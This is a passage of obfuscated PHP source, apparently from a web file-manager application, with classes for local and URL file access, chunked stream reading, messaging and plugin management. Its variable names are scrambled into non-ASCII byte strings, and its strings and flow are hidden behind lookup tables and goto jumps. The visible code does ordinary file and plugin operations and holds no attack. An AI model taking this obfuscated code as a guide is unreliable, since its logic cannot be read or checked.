&$‡Š±ƒ…‡, $´Í´ˆœ = true) { $äéúööü =& $_SERVER[¡“ËÌ§œ]; check_abort_echo(); $ûÙ©Ô¢ = rtrim($ûÙ©Ô¢, $äéúööü[8]) . $äéúööü[8]; if ($´Í´ˆœ) { $ûÙ©Ô¢ = $this->iconvSystem($ûÙ©Ô¢); } if (!($ùÓ”´ü… = @opendir($ûÙ©Ô¢))) { return; } while (($š·€¬¨Š = readdir($ùÓ”´ü…)) !== !1) { if ($š·€¬¨Š == $äéúööü[10] || $š·€¬¨Š == $äéúööü[1299]) { continue; } $Î¬Ôø„ó = $ûÙ©Ô¢ . $š·€¬¨Š; if (is_file($Î¬Ôø„ó) || is_link($Î¬Ôø„ó)) { $‡Š±ƒ…‡[$äéúööü[77]]++; $‡Š±ƒ…‡[$äéúööü[76]] += filesize_64($Î¬Ôø„ó); } else { if (is_dir($Î¬Ôø„ó)) { $‡Š±ƒ…‡[$äéúööü[78]]++; $this->infoChildren($Î¬Ôø„ó, $‡Š±ƒ…‡, !1); } } } closedir($ùÓ”´ü…); } private function folderInfo($˜¨İùªÍ, $™õÛù© = false) { $ùúÏ‹Ñò =& $_SERVER[¡“ËÌ§œ]; $˜¨İùªÍ = rtrim($˜¨İùªÍ, $ùúÏ‹Ñò[8]) . $ùúÏ‹Ñò[8]; $üó¾ñ«À = $this->iconvApp($this->pathThis($˜¨İùªÍ)); if ($™õÛù©) { return array($ùúÏ‹Ñò[32] => $üó¾ñ«À, $ùúÏ‹Ñò[84] => $this->getPathOuter($˜¨İùªÍ), $ùúÏ‹Ñò[33] => $ùúÏ‹Ñò[75]); } $ä¹¶˜Ë¦ = array($ùúÏ‹Ñò[32] => $üó¾ñ«À, $ùúÏ‹Ñò[84] => $this->getPathOuter($˜¨İùªÍ), $ùúÏ‹Ñò[33] => $ùúÏ‹Ñò[75], $ùúÏ‹Ñò[201] => @filectime($˜¨İùªÍ), $ùúÏ‹Ñò[85] => @filemtime($˜¨İùªÍ), $ùúÏ‹Ñò[1383] => @fileatime($˜¨İùªÍ), $ùúÏ‹Ñò[1384] => is_readable($˜¨İùªÍ), $ùúÏ‹Ñò[1385] => is_writable($˜¨İùªÍ), $ùúÏ‹Ñò[1386] => get_mode($˜¨İùªÍ)); return $ä¹¶˜Ë¦; } private function fileInfo($‹¾§Èï™, $ØÌàã±­ = false) { $ÕÕ…Èâ =& $_SERVER[¡“ËÌ§œ]; $Ú«¼²Ò¹ = $this->iconvApp($this->pathThis($‹¾§Èï™)); if ($ØÌàã±­) { return array($ÕÕ…Èâ[32] => $Ú«¼²Ò¹, $ÕÕ…Èâ[84] => $this->getPathOuter($‹¾§Èï™), $ÕÕ…Èâ[33] => $ÕÕ…Èâ[200], $ÕÕ…Èâ[76] => $this->size($‹¾§Èï™), $ÕÕ…Èâ[174] => $this->ext($Ú«¼²Ò¹)); } $ÄÙœãøÓ = array($ÕÕ…Èâ[32] => $Ú«¼²Ò¹, $ÕÕ…Èâ[84] => $this->getPathOuter($‹¾§Èï™), $ÕÕ…Èâ[33] => $ÕÕ…Èâ[200], $ÕÕ…Èâ[201] => @filectime($‹¾§Èï™), $ÕÕ…Èâ[85] => @filemtime($‹¾§Èï™), $ÕÕ…Èâ[1383] => @fileatime($‹¾§Èï™), $ÕÕ…Èâ[76] => $this->size($‹¾§Èï™), $ÕÕ…Èâ[174] => $this->ext($Ú«¼²Ò¹), $ÕÕ…Èâ[1384] => is_readable($‹¾§Èï™), $ÕÕ…Èâ[1385] => is_writable($‹¾§Èï™), $ÕÕ…Èâ[1386] => get_mode($‹¾§Èï™)); return $ÄÙœãøÓ; } public function exist($Ÿê©†’÷) { $Ÿê©†’÷ = $this->iconvSystem($Ÿê©†’÷); return @file_exists($Ÿê©†’÷); } public function isFile($âáû¤) { $âáû¤ = $this->iconvSystem($âáû¤); return @is_file($âáû¤); } public function isFolder($î­õ›ûÓ) { $î­õ›ûÓ = $this->iconvSystem($î­õ›ûÓ); return @is_dir($î­õ›ûÓ); } public function listPath($Ÿ»š½¸ë, $æ¤ûİ·ú = false) { $­ÅË±ş =& $_SERVER[¡“ËÌ§œ]; $Ÿ»š½¸ë = $this->iconvSystem($Ÿ»š½¸ë); $Ÿ»š½¸ë = rtrim($Ÿ»š½¸ë, $­ÅË±ş[8]) . $­ÅË±ş[8]; $¬‘”‰²€ = array($­ÅË±ş[82] => array(), $­ÅË±ş[83] => array()); if (!($´©¨†¯ø = @opendir($Ÿ»š½¸ë))) { return $¬‘”‰²€; } while (($¢øµœ¿¨ = readdir($´©¨†¯ø)) !== !1) { if ($¢øµœ¿¨ == $­ÅË±ş[10] || $¢øµœ¿¨ == $­ÅË±ş[1299]) { continue; } $ç€¼°Û— = $Ÿ»š½¸ë . $¢øµœ¿¨; if (is_file($ç€¼°Û—)) { $¬‘”‰²€[$­ÅË±ş[83]][] = $this->fileInfo($ç€¼°Û—, $æ¤ûİ·ú); } else { $¬‘”‰²€[$­ÅË±ş[82]][] = $this->folderInfo($ç€¼°Û—, $æ¤ûİ·ú); } } closedir($´©¨†¯ø); return $¬‘”‰²€; } public function listAll($¥¤˜å¨ò, &$’öóİñØ = array()) { $òà ëŸ =& $_SERVER[¡“ËÌ§œ]; $¥¤˜å¨ò = $this->iconvSystem($¥¤˜å¨ò); $¥¤˜å¨ò = rtrim($¥¤˜å¨ò, $òà ëŸ[8]) . $òà ëŸ[8]; if (!($¶è™é°â = @opendir($¥¤˜å¨ò))) { return $’öóİñØ; } while (($Ïûò¸„ù = readdir($¶è™é°â)) !== !1) { if ($Ïûò¸„ù == $òà ëŸ[10] || $Ïûò¸„ù == $òà ëŸ[1299]) { continue; } $Šå–Éøã = $¥¤˜å¨ò . $Ïûò¸„ù; $ƒâí‹Ùù = is_dir($Šå–Éøã) && !is_link($Šå–Éøã) ? 1 : 0; $Šå–Éøã = $ƒâí‹Ùù ? $Šå–Éøã . $òà ëŸ[8] : $Šå–Éøã; $’öóİñØ[] = array($òà ëŸ[84] => $Šå–Éøã, $òà ëŸ[75] => $ƒâí‹Ùù, $òà ëŸ[85] => intval(@filemtime($Šå–Éøã)), $òà ëŸ[76] => $ƒâí‹Ùù ? 0 : intval($this->size($Šå–Éøã))); if ($ƒâí‹Ùù) { $this->listAll($Šå–Éøã, $’öóİñØ); } } closedir($¶è™é°â); return $’öóİñØ; } public function has($¦Ó¿Ç×ø, $´·â¦´  = false, $‘”²ä×Û = true) { $ÚÆÑ’ú =& $_SERVER[¡“ËÌ§œ]; $¦Ó¿Ç×ø = $this->iconvSystem($¦Ó¿Ç×ø); $¦Ó¿Ç×ø = rtrim($¦Ó¿Ç×ø, $ÚÆÑ’ú[8]) . $ÚÆÑ’ú[8]; if (!($£Û¶ëÚÁ = @opendir($¦Ó¿Ç×ø))) { return !1; } $ÎÀ·åËæ = 0; $Óè‡Ó = 0; $ÑÖ½Î¨” = 0; while (($ÆôÒö¶Î = readdir($£Û¶ëÚÁ)) !== !1) { if ($ÆôÒö¶Î == $ÚÆÑ’ú[10] || $ÆôÒö¶Î == $ÚÆÑ’ú[1299]) { continue; } $à»—Ïµà = $¦Ó¿Ç×ø . $ÆôÒö¶Î; if ($´·â¦´ ) { $ÑÖ½Î¨”++; if (@is_file($à»—Ïµà)) { $ÎÀ·åËæ++; } else { $Óè‡Ó++; } if ($ÑÖ½Î¨” > 10000) { break; } continue; } if ($‘”²ä×Û) { if (@is_file($à»—Ïµà)) { return !0; } } else { if (@is_dir($à»—Ïµà . $ÚÆÑ’ú[8])) { return !0; } } } closedir($£Û¶ëÚÁ); if ($´·â¦´ ) { return array($ÚÆÑ’ú[207] => $ÎÀ·åËæ, $ÚÆÑ’ú[208] => $Óè‡Ó); } return !1; } public function hashSimple($ †å£¡) { $³´´‹ô =& $_SERVER[¡“ËÌ§œ]; if (!$ †å£¡) { return md5($³´´‹ô[12]); } $ †å£¡ = $this->iconvSystem($ †å£¡); $·™ˆƒûğ = $this->size($ †å£¡); $ıÇ¢ÀÓÄ = 200; $ãâÈÂÛ‚ = 50; if ($·™ˆƒûğ <= $ıÇ¢ÀÓÄ * $ãâÈÂÛ‚) { return $this->hashMd5($ †å£¡) . $·™ˆƒûğ; } $‡ÇŸÓäş = $³´´‹ô[12]; $§’úèÔÁ = intval($·™ˆƒûğ / $ãâÈÂÛ‚); $‹ä‡œ— = fopen($ †å£¡, $³´´‹ô[1387]); if (!$‹ä‡œ—) { return $‡ÇŸÓäş; } for ($ğ©©íĞù = 0; $ğ©©íĞù < $ãâÈÂÛ‚; $ğ©©íĞù++) { fseek_64($‹ä‡œ—, $§’úèÔÁ * $ğ©©íĞù); $‡ÇŸÓäş .= fread($‹ä‡œ—, $ıÇ¢ÀÓÄ); } fseek_64($‹ä‡œ—, $·™ˆƒûğ - $ıÇ¢ÀÓÄ); $‡ÇŸÓäş .= fread($‹ä‡œ—, $ıÇ¢ÀÓÄ); fclose($‹ä‡œ—); return md5($‡ÇŸÓäş) . $·™ˆƒûğ; } public function getContent($—†®Ìåƒ) { $—†®Ìåƒ = $this->iconvSystem($—†®Ìåƒ); return file_get_contents($—†®Ìåƒ); } public function setContent($¸ØÏ·øå, $€ÀÉ– = '') { $¸ØÏ·øå = $this->iconvSystem($¸ØÏ·øå); $†§¦ìí• = @file_put_contents($¸ØÏ·øå, $€ÀÉ–, LOCK_EX); clearstatcache(); @chmod($¸ØÏ·øå, $this->pathAuth); return $†§¦ìí• === !1 ? !1 : !0; } public function fileSubstr($ÁÛ×Áøë, $èèî½¬ = 0, $Êû¶Ÿ‘ = false) { $¹çª¡ =& $_SERVER[¡“ËÌ§œ]; $ÁÛ×Áøë = $this->iconvSystem($ÁÛ×Áøë); if ($Êû¶Ÿ‘ === !1) { $Êû¶Ÿ‘ = $this->size($ÁÛ×Áøë); } if ($Êû¶Ÿ‘ <= 0) { return $¹çª¡[12]; } $—çÍõÜœ = fopen($ÁÛ×Áøë, $¹çª¡[1387]); if (!$—çÍõÜœ) { return !1; } fseek_64($—çÍõÜœ, $èèî½¬); $¢õâ²á± = fread($—çÍõÜœ, $Êû¶Ÿ‘); fclose($—çÍõÜœ); return $¢õâ²á±; } public function upload($ş‰ú´ ò, $øËÏá“¹, $ãÔà³® = false, $Ó€ˆŸÅá = REPEAT_REPLACE) { if ($ãÔà³®) { return $this->moveFile($øËÏá“¹, $ş‰ú´ ò); } return $this->copyFile($øËÏá“¹, $ş‰ú´ ò); } public function setModifyTime($Ù°°™Ôµ, $ğÑçåç = '') { @touch($Ù°°™Ôµ, intval($ğÑçåç)); } public function download($°ìÕŞºË, $³ÕÔÏ£) { return $this->iconvSystem($°ìÕŞºË); } } goto Cã»ÒÉ¹Ê‡; AØ´ËçğÀä: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($—ıÆ‚üã = false) { } public function exist($ñÔ ¹ª¥) { $ı‰çµ¶È = $this->info($ñÔ ¹ª¥); return $ı‰çµ¶È[$_SERVER[¡“ËÌ§œ][202]]; } public function isFile($€¡éÜÏš) { $Ê’«Ôí’ = $this->info($€¡éÜÏš); return $Ê’«Ôí’[$_SERVER[¡“ËÌ§œ][202]]; } public function isFolder($“ìçÅÜÎ) { return !1; } public function size($Ê½˜ÉŒÜ) { $¶İ”ğŸû = $this->info($Ê½˜ÉŒÜ); return $¶İ”ğŸû[$_SERVER[¡“ËÌ§œ][76]]; } public function info($ßÈ–±±) { return $this->infoParse($ßÈ–±±); } public function infoAuth($Å§ÅÚ÷Ó) { return $this->infoParse($Å§ÅÚ÷Ó); } public function infoWithChildren($‡„Ù‰ó–) { return $this->infoParse($‡„Ù‰ó–); } public function infoFull($¥çß‡å”) { return $this->infoParse($¥çß‡å”); } private function infoParse($ĞÜĞÏíß) { $ÃºË„æ =& $_SERVER[¡“ËÌ§œ]; $„¾»È­ª = $this->header($ĞÜĞÏíß); if (!$„¾»È­ª || !$„¾»È­ª[$ÃºË„æ[770]]) { return !1; } $¬Ã ¸éº = _get($„¾»È­ª, $ÃºË„æ[366], 0); $ŞâÁğ×„ = array($ÃºË„æ[32] => $„¾»È­ª[$ÃºË„æ[32]], $ÃºË„æ[84] => $ĞÜĞÏíß, $ÃºË„æ[33] => $ÃºË„æ[200], $ÃºË„æ[76] => intval($¬Ã ¸éº), $ÃºË„æ[174] => get_path_ext($„¾»È­ª[$ÃºË„æ[32]]), $ÃºË„æ[1384] => $¬Ã ¸éº > 0 && $„¾»È­ª[$ÃºË„æ[1506]], $ÃºË„æ[1385] => !1); return $ŞâÁğ×„; } private function header($õ¸¢ş£½) { $×†ĞéÖ =& $_SERVER[¡“ËÌ§œ]; if (isset(self::$_cacheHeader[$õ¸¢ş£½])) { return self::$_cacheHeader[$õ¸¢ş£½]; } $ëÖ¢ÁñÅ = isset($GLOBALS[$×†ĞéÖ[1507]]) ? $GLOBALS[$×†ĞéÖ[1507]] : !1; $GLOBALS[$×†ĞéÖ[1507]] = !0; self::$_cacheHeader[$õ¸¢ş£½] = url_header($õ¸¢ş£½); $GLOBALS[$×†ĞéÖ[1507]] = $ëÖ¢ÁñÅ; return self::$_cacheHeader[$õ¸¢ş£½]; } public function hashSimple($î‡Å²ø¥, $Åªş©‡Ù = false) { $€´˜Ş†¾ =& $_SERVER[¡“ËÌ§œ]; $´ë™Ïìš = $this->info($î‡Å²ø¥); if (!$´ë™Ïìš || !$´ë™Ïìš[$€´˜Ş†¾[202]]) { return !1; } $ÓÔŞ¹Ó = $´ë™Ïìš[$€´˜Ş†¾[76]]; $ªâÊÎ“­ = 200; $ŞßÄÉßË = 50; if ($ÓÔŞ¹Ó <= $ªâÊÎ“­ * $ŞßÄÉßË) { return md5($this->fileSubstr($î‡Å²ø¥, 0, $ÓÔŞ¹Ó)) . $ÓÔŞ¹Ó; } $•ƒĞ®î« = intval($ÓÔŞ¹Ó / $ŞßÄÉßË); $õïë¬Ñ® = $€´˜Ş†¾[12]; $¿ú¶¦ÎÑ = timeFloat(); $ƒ‰£× = 15; for ($æ½Ë“ğÃ = 0; $æ½Ë“ğÃ < $ŞßÄÉßË; $æ½Ë“ğÃ++) { if (timeFloat() - $¿ú¶¦ÎÑ > $ƒ‰£×) { return !1; } $ˆÆï±‘  = $this->fileSubstr($î‡Å²ø¥, $•ƒĞ®î« * $æ½Ë“ğÃ, $ªâÊÎ“­); if (!$ˆÆï±‘ ) { return !1; } $õïë¬Ñ® .= $ˆÆï±‘ ; } $õïë¬Ñ® .= $this->fileSubstr($î‡Å²ø¥, $ÓÔŞ¹Ó - $ªâÊÎ“­, $ªâÊÎ“­); return md5($õïë¬Ñ®) . $ÓÔŞ¹Ó; } public function getContent($Ş‡Ï›Æ­) { return $this->fileSubstr($Ş‡Ï›Æ­); } public function fileSubstr($Ê–µ²ºœ, $ñÛÕ‹Ã² = 0, $ş¶Æ„›å = -1) { $Ú‘òğ =& $_SERVER[¡“ËÌ§œ]; $Ô½ëüõŸ = $this->info($Ê–µ²ºœ); if (!$Ô½ëüõŸ || !$Ô½ëüõŸ[$Ú‘òğ[202]] && $Ô½ëüõŸ[$Ú‘òğ[76]] > 1024 * 1024 * 10) { return !1; } if ($ş¶Æ„›å === -1) { $ş¶Æ„›å = $Ô½ëüõŸ[$Ú‘òğ[76]]; } if ($ş¶Æ„›å == 0) { return $Ú‘òğ[12]; } $§¦‹†³ = array($Ú‘òğ[1508] . $ñÛÕ‹Ã² . $Ú‘òğ[802] . ($ñÛÕ‹Ã² + $ş¶Æ„›å - 1)); $æôğöÒü = url_request($Ê–µ²ºœ, $Ú‘òğ[230], !1, $§¦‹†³, !1, !1, 30); return $æôğöÒü[$Ú‘òğ[1222]] ? $æôğöÒü[$Ú‘òğ[1222]] : $Ú‘òğ[12]; } public function download($ö²¶şÜ¶, $Ë¤¬–ˆ¨) { Downloader::start($ö²¶şÜ¶, $Ë¤¬–ˆ¨); return $Ë¤¬–ˆ¨; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($éÖÈ…á¹, $í²ãÕÇ = '') { $this->info = $this->info($éÖÈ…á¹); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¡“ËÌ§œ][84]]; $this->pathOpen = $éÖÈ…á¹; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$éÖÈ…á¹])) { self::$_chunkBuffer[$éÖÈ…á¹] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ä†ĞĞ›â) { $»ñ±¨öÜ = $this->fileSubstr($this->pose, $ä†ĞĞ›â); $this->pose += strlen($»ñ±¨öÜ); return $»ñ±¨öÜ; } public function stream_tell() { return $this->pose; } public function stream_seek($ğĞÎáµí, $¦²¡™£ş) { $€×Àí£³ =& $_SERVER[¡“ËÌ§œ]; if ($¦²¡™£ş == SEEK_SET) { $this->pose = $ğĞÎáµí; } else { if ($¦²¡™£ş == SEEK_CUR) { $this->pose += $ğĞÎáµí; } else { if ($¦²¡™£ş == SEEK_END) { $this->pose = $this->info[$€×Àí£³[76]] + intval($ğĞÎáµí); } } } if ($ğĞÎáµí < 0) { $this->pose = $this->info[$€×Àí£³[76]] + $ğĞÎáµí; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¡“ËÌ§œ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÅÙ¼æò›, $ÏûÎ’Ä) { $Å“ßŸÕˆ =& $_SERVER[¡“ËÌ§œ]; $ØéÇÏ³ = $this->info($ÅÙ¼æò›); return array($Å“ßŸÕˆ[1509] => 0, $Å“ßŸÕˆ[1510] => 0, $Å“ßŸÕˆ[16] => 32768 + 511, $Å“ßŸÕˆ[1511] => 0, $Å“ßŸÕˆ[1512] => 0, $Å“ßŸÕˆ[1513] => 0, $Å“ßŸÕˆ[1514] => 0, $Å“ßŸÕˆ[76] => $ØéÇÏ³[$Å“ßŸÕˆ[76]], $Å“ßŸÕˆ[1515] => $ØéÇÏ³[$Å“ßŸÕˆ[1383]], $Å“ßŸÕˆ[1471] => $ØéÇÏ³[$Å“ßŸÕˆ[85]], $Å“ßŸÕˆ[1470] => $ØéÇÏ³[$Å“ßŸÕˆ[201]], $Å“ßŸÕˆ[1516] => 0, $Å“ßŸÕˆ[1517] => 0); } static $fileInfo = array(); public function info($îŞ…ã¸Ş) { $áŠó€²  = $_SERVER[¡“ËÌ§œ][1518]; if (isset(self::$fileInfo[$îŞ…ã¸Ş])) { return self::$fileInfo[$îŞ…ã¸Ş]; } if (substr($îŞ…ã¸Ş, 0, strlen($áŠó€² )) != $áŠó€² ) { return !1; } self::$fileInfo[$îŞ…ã¸Ş] = IO::info(substr($îŞ…ã¸Ş, strlen($áŠó€² ))); return self::$fileInfo[$îŞ…ã¸Ş]; } public static function read($Õ×Ø‘Îî, $ÓìäÈƒ£, $ÎÓ×ı¯) { if (!isset(self::$_fopenCache[$Õ×Ø‘Îî])) { $ñÆĞº‰“ = new StreamWrapperIO(); $ñÆĞº‰“->stream_open($Õ×Ø‘Îî); self::$_fopenCache[$Õ×Ø‘Îî] = $ñÆĞº‰“; } $ñÆĞº‰“ = self::$_fopenCache[$Õ×Ø‘Îî]; return $ñÆĞº‰“->fileSubstr($ÓìäÈƒ£, $ÎÓ×ı¯); } public static function _read($„Õ¨šáú, $ØòŞ¤Ğİ, $¼•Êûå¯) { $ªÆÀ ÒÀ =& $_SERVER[¡“ËÌ§œ]; $òÙöÑ«‘ = fopen($„Õ¨šáú, $ªÆÀ ÒÀ[1387]); if (!$òÙöÑ«‘) { return $ªÆÀ ÒÀ[12]; } $ÁÍÕ¸ı¸ = 8192; fseek($òÙöÑ«‘, $ØòŞ¤Ğİ, SEEK_SET); $–Öúß¡ï = $ªÆÀ ÒÀ[12]; $²²îºäö = 0; while ($²²îºäö < $¼•Êûå¯) { $Óà±ª = min($ÁÍÕ¸ı¸, $¼•Êûå¯ - $²²îºäö); $–Öúß¡ï .= fread($òÙöÑ«‘, $Óà±ª); $²²îºäö += $Óà±ª; } fclose($òÙöÑ«‘); return $–Öúß¡ï; } public function fileSubstr($âïåç¥Œ, $ğ´¾úÌ) { $ É«ªÜí =& $_SERVER[¡“ËÌ§œ]; $¸ùÚ° = $this->info[$ É«ªÜí[76]]; $øÂ‹Ô…¾ = $âïåç¥Œ; $ßÊÚá©í = $ğ´¾úÌ; if ($âïåç¥Œ < 0) { $âïåç¥Œ = $¸ùÚ° + $âïåç¥Œ; } if ($ğ´¾úÌ === !1) { $ğ´¾úÌ = $¸ùÚ° - $âïåç¥Œ; } if ($âïåç¥Œ + $ğ´¾úÌ > $¸ùÚ°) { $ğ´¾úÌ = $¸ùÚ° - $âïåç¥Œ; } if ($ğ´¾úÌ <= 0) { return $ É«ªÜí[12]; } if ($âïåç¥Œ < 0 || $âïåç¥Œ >= $¸ùÚ° || $ğ´¾úÌ <= 0 || $ğ´¾úÌ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\x6c\145\x52\145\x61\x64\40\x65\x72\162\157\162\x21\40\163\x74\141\162\164\75{$âïåç¥Œ}\x3b\x6c\x65\x6e\147\164\150\x3d{$ğ´¾úÌ}\x3b\40\163\151\172\x65\x3d{$¸ùÚ°}\73"); } $ğ€Â¯Öà = 64 * 1024; $í¡ËÙ¼” =& self::$_chunkBuffer[$this->path]; if (!$í¡ËÙ¼”) { $í¡ËÙ¼” = array(); } $„±±Ê¤ = 0; $É…¡•šÃ = 0; $æÆû’ë— = $ É«ªÜí[12]; foreach ($í¡ËÙ¼” as $„±±Ê¤ => $æÆû’ë—) { $„±±Ê¤ = intval($„±±Ê¤); $É…¡•šÃ = $„±±Ê¤ + strlen($æÆû’ë—); if ($âïåç¥Œ >= $É…¡•šÃ) { continue; } if ($âïåç¥Œ >= $„±±Ê¤ && $âïåç¥Œ + $ğ´¾úÌ <= $É…¡•šÃ) { return substr($æÆû’ë—, $âïåç¥Œ - $„±±Ê¤, $ğ´¾úÌ); } break; } if (count($í¡ËÙ¼”) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ É«ªÜí[1519], $ É«ªÜí[1520] . count($í¡ËÙ¼”) . "\73\163\164\141\162\164\75{$âïåç¥Œ}\54\154\x65\x6e\x67\164\x68\x3d{$ğ´¾úÌ}\x3b\160\157\163\x65\72{$„±±Ê¤}\176{$É…¡•šÃ}"); throw new Exception($ É«ªÜí[1521]); } $âº½üâ = intval($âïåç¥Œ / $ğ€Â¯Öà) * $ğ€Â¯Öà; $ÉğñÓ = ceil(($âïåç¥Œ + $ğ´¾úÌ) / $ğ€Â¯Öà) * $ğ€Â¯Öà - $âº½üâ; $ğ—©ŠËó = IO::fileSubstr($this->path, $âº½üâ, $ÉğñÓ); $í¡ËÙ¼”[$âº½üâ . $ É«ªÜí[12]] = $ğ—©ŠËó; ksort($í¡ËÙ¼”); $­×áÖ·ƒ = substr($ğ—©ŠËó, $âïåç¥Œ - $âº½üâ, $ğ´¾úÌ); return $­×áÖ·ƒ; } private function log($ëË”ÄŠã, $ä€€Ÿñ×) { $·ƒ ‰² =& $_SERVER[¡“ËÌ§œ]; $éğ¹âÛ× = timeFloat() - $this->timeStart; write_log(sprintf($·ƒ ‰²[1522], $ëË”ÄŠã, $this->info[$·ƒ ‰²[32]], $éğ¹âÛ×, $ä€€Ÿñ×), $·ƒ ‰²[1202]); } } class Message { function __construct() { } public function send($ë®Èş±İ = '', $óÓ»§³Ì = array(), $ğËíÏ’ì = "\x74\145\x78\164") { $òöïç™ =& $_SERVER[¡“ËÌ§œ]; $ÏÒÛ£Àº = array($òöïç™[33] => $òöïç™[1523], $òöïç™[774] => $ë®Èş±İ); if (in_array($ğËíÏ’ì, array($òöïç™[1523], $òöïç™[1524]))) { $ÏÒÛ£Àº[$òöïç™[33]] = $ğËíÏ’ì; } $óÓ»§³Ì = array($òöïç™[543] => isset($óÓ»§³Ì[$òöïç™[543]]) ? $óÓ»§³Ì[$òöïç™[543]] : $òöïç™[12], $òöïç™[628] => isset($óÓ»§³Ì[$òöïç™[628]]) ? $óÓ»§³Ì[$òöïç™[628]] : $òöïç™[12]); if (empty($ë®Èş±İ) || empty($óÓ»§³Ì[$òöïç™[543]]) && empty($óÓ»§³Ì[$òöïç™[628]])) { return !1; } $öô¥Â–™ = array($òöïç™[1464] => $ÏÒÛ£Àº, $òöïç™[1525] => $óÓ»§³Ì); Hook::trigger($òöïç™[1526], $öô¥Â–™); } } goto F¯‡‰¾áÓ; aÎˆ‰í–æ: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x70\x6c\165\147\x69\156\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x73\164\x61\x74\165\163", "\x72\x65\147\x69\145\163\164", "\x63\x6f\156\146\151\x67"); public function loadList($ˆ»Á‡¬ = false) { $»¥°¦Œ× = array_to_keyvalue($this->listData(), $_SERVER[¡“ËÌ§œ][32]); if ($ˆ»Á‡¬) { return $»¥°¦Œ×[$ˆ»Á‡¬]; } return $»¥°¦Œ×; } public function init() { $è£öáÏ =& $_SERVER[¡“ËÌ§œ]; Hook::trigger($è£öáÏ[1971]); $È§Öá­ = $this->loadPluginList(); foreach ($È§Öá­ as $ÚéîÁ±¤ => $¡äÛåƒ•) { $² Š¶‹µ = $this->appAllow($ÚéîÁ±¤, $¡äÛåƒ•); if (!$² Š¶‹µ) { continue; } foreach ($¡äÛåƒ•[$è£öáÏ[1972]] as $‚¡ì›ÇÂ => $‡Ïªˆ¨) { Hook::bind($‚¡ì›ÇÂ, $‡Ïªˆ¨); } } Hook::trigger($è£öáÏ[1973]); Hook::trigger(ACTION); } public function appAllow($®áÀÏü˜, $Â¼ò“±Å, $˜¦î°ß = true) { $ÏãÄª… =& $_SERVER[¡“ËÌ§œ]; $Ş”Â“ÂÇ = PLUGIN_DIR . $®áÀÏü˜ . $ÏãÄª…[1974]; if (!is_array($Â¼ò“±Å) || !is_array($Â¼ò“±Å[$ÏãÄª…[1972]]) || $Â¼ò“±Å[$ÏãÄª…[770]] != 1 || !is_file($Ş”Â“ÂÇ)) { return !1; } if ($GLOBALS[$ÏãÄª…[532]] == 1) { if ($GLOBALS[$ÏãÄª…[6]][$ÏãÄª…[1975]] || !$GLOBALS[$ÏãÄª…[6]][$ÏãÄª…[1976]]) { return !0; } $›Î›ÅÁĞ = explode($ÏãÄª…[50], strtolower($GLOBALS[$ÏãÄª…[6]][$ÏãÄª…[1976]])); return in_array(strtolower($®áÀÏü˜), $›Î›ÅÁĞ) ? !1 : !0; } if ($˜¦î°ß && !Action($ÏãÄª…[1977])->checkAuth($®áÀÏü˜)) { return !1; } return !0; } public function unInstall($Ï¯Ÿ¶¢) { $ÖÃ¸˜ñ× =& $_SERVER[¡“ËÌ§œ]; $³½Åô¹£ = $this->loadList($Ï¯Ÿ¶¢); if (file_exists(PLUGIN_DIR . $Ï¯Ÿ¶¢)) { Hook::apply($Ï¯Ÿ¶¢ . $ÖÃ¸˜ñ×[1978]); } $this->remove($³½Åô¹£[$ÖÃ¸˜ñ×[437]]); } public function changeStatus($Ù®ŞÉƒá, $ƒş¿Èâ¹) { $Éİ…“œ£ =& $_SERVER[¡“ËÌ§œ]; $æèàê÷È = $this->loadList($Ù®ŞÉƒá); if ($ƒş¿Èâ¹) { Hook::apply($Ù®ŞÉƒá . $Éİ…“œ£[1979]); } $this->update($æèàê÷È[$Éİ…“œ£[437]], array($Éİ…“œ£[1980] => $ƒş¿Èâ¹)); } public function appRegist($¯È’Œ‡°, $»ı¸Ü”Â) { $¹³áíË =& $_SERVER[¡“ËÌ§œ]; $ù¥®®æú = $this->loadList($¯È’Œ‡°); if ($ù¥®®æú) { $this->update($ù¥®®æú[$¹³áíË[437]], array($¹³áíË[1972] => $»ı¸Ü”Â)); } else { $¿ÂŞ×·˜ = array($¹³áíË[32] => $¯È’Œ‡°, $¹³áíË[1972] => $»ı¸Ü”Â, $¹³áíË[770] => 0, $¹³áíË[6] => $this->getConfigDefault($¯È’Œ‡°)); $this->insert($¿ÂŞ×·˜); } } public function getConfigDefault($‡œÛ×‘Ş) { $¬ÀŸº”‰ =& $_SERVER[¡“ËÌ§œ]; $Şš¼Æ˜ï = array(); $ß¸Ó’´ = $this->getPackageJson($‡œÛ×‘Ş); if (!$ß¸Ó’´ && is_array($ß¸Ó’´[$¬ÀŸº”‰[1981]])) { return $Şš¼Æ˜ï; } foreach ($ß¸Ó’´[$¬ÀŸº”‰[1981]] as $ ¹…Òˆ => $°ª¿¾„Ş) { if (!isset($°ª¿¾„Ş[$¬ÀŸº”‰[403]]) || isset($Şš¼Æ˜ï[$ ¹…Òˆ])) { continue; } $Şš¼Æ˜ï[$ ¹…Òˆ] = $°ª¿¾„Ş[$¬ÀŸº”‰[403]]; } return $Şš¼Æ˜ï; } public function getPackageJson($€ƒğ†²Œ) { return Hook::apply($€ƒğ†²Œ . $_SERVER[¡“ËÌ§œ][1982]); } public function getConfig($ÃÆØãƒÃ, $û™öî = false) { $ÅÈ„ üŒ =& $_SERVER[¡“ËÌ§œ]; $µô”—º‰ = array(); $î¹ŸºÆÓ = $this->loadList($ÃÆØãƒÃ); if ($î¹ŸºÆÓ && is_array($î¹ŸºÆÓ[$ÅÈ„ üŒ[6]])) { $µô”—º‰ = $î¹ŸºÆÓ[$ÅÈ„ üŒ[6]]; } if (!$µô”—º‰ || $û™öî) { $µô”—º‰ = $this->getConfigDefault($ÃÆØãƒÃ); } return $µô”—º‰; } public function setConfig($Ê¨‰î€ã, $¤ÉÓ– = false) { 